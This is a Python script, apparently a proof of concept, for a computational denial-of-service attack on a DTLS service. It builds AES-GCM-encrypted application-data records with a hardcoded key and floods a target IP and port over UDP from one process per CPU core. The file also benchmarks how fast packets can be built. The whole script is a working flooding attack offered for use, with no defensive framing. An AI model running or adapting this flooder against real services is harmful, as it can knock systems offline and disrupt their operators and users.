import socket
import time
import struct
import os
import multiprocessing
import statistics
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

TARGET_IP = '192.168.1.104'
TARGET_PORT = 9999

SESSION_KEY = b'\xab' * 16
SALT = b'\xbb' * 4

SLEEP_INTERVAL = 0.001
PAYLOAD_SIZE = 1400
PROCESS_COUNT = multiprocessing.cpu_count()
ATTACK_DURATION = 10


class DTLSAttacker:
    VERSION = 0xFEFD
    CONTENT_TYPE_APP_DATA = 23

    def __init__(self, key, salt):
        self.aesgcm = AESGCM(key)
        self.salt = salt

    def pack_malicious_record(self, payload, epoch, seq_num):
        explicit_nonce = os.urandom(8)
        nonce = self.salt + explicit_nonce

        encrypted_len = len(explicit_nonce) + len(payload) + 16
        combined_seq = (epoch << 48) | (seq_num & 0xFFFFFFFFFFFF)
        aad_header = struct.pack('!Q B H H', combined_seq, self.CONTENT_TYPE_APP_DATA, self.VERSION, encrypted_len)

        ciphertext_with_tag = self.aesgcm.encrypt(nonce, payload, aad_header)

        seq_bytes = struct.pack('!Q', seq_num)[2:]
        header = struct.pack('!B H H', self.CONTENT_TYPE_APP_DATA, self.VERSION, epoch) + \
                 seq_bytes + \
                 struct.pack('!H', encrypted_len)

        return header + explicit_nonce + ciphertext_with_tag


def run_benchmark(key, salt, payload_size, iterations=1000):
    print(f"\n[Benchmark] Running benchmark with {iterations} iterations...")
    attacker = DTLSAttacker(key, salt)
    payload = os.urandom(payload_size)
    epoch = 1
    seq_num = 1

    times = []

    attacker.pack_malicious_record(payload, epoch, seq_num)

    for _ in range(iterations):
        start_time = time.perf_counter()
        attacker.pack_malicious_record(payload, epoch, seq_num)
        end_time = time.perf_counter()
        times.append((end_time - start_time) * 1_000_000)
        seq_num += 1

    avg_time = statistics.mean(times)
    min_time = min(times)
    max_time = max(times)
    pps = 1_000_000 / (avg_time + (SLEEP_INTERVAL * 1000_000))

    print(f"[Benchmark] Result (per packet construction):")
    print(f"   Avg Time: {avg_time:.2f} µs")
    print(f"   Theoretical Max PPS (Single Core): {pps:.0f} packets/sec")
    print("-" * 40 + "\n")


def attack_worker(worker_id, target_ip, target_port, key, salt, sleep_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)

    attacker = DTLSAttacker(key, salt)
    epoch = 1
    seq_num = worker_id * 1000000
    base_payload = os.urandom(PAYLOAD_SIZE)

    print(f"[+] Worker {worker_id} started.")

    try:
        while True:
            seq_num += 1
            packet = attacker.pack_malicious_record(base_payload, epoch, seq_num)
            sock.sendto(packet, (target_ip, target_port))

            if sleep_time > 0:
                time.sleep(sleep_time)

    except Exception as e:
        print(f"Worker {worker_id} error: {e}")


if __name__ == "__main__":
    run_benchmark(SESSION_KEY, SALT, PAYLOAD_SIZE)

    print(f"[*] Starting High-Load C-DoS Attack to {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Using {PROCESS_COUNT} CPU cores for parallel attack.")
    print(f"[*] Attack will last for {ATTACK_DURATION} seconds.")

    processes = []
    try:
        for i in range(PROCESS_COUNT):
            p = multiprocessing.Process(
                target=attack_worker,
                args=(i, TARGET_IP, TARGET_PORT, SESSION_KEY, SALT, SLEEP_INTERVAL)
            )
            p.daemon = True
            p.start()
            processes.append(p)

        time.sleep(ATTACK_DURATION)

        print(f"\n[!] Time is up ({ATTACK_DURATION}s). Stopping all workers...")


        for p in processes:
            p.terminate()
            p.join()

        print("[*] Attack finished.")

    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user early.")
        for p in processes:
            p.terminate()
            p.join()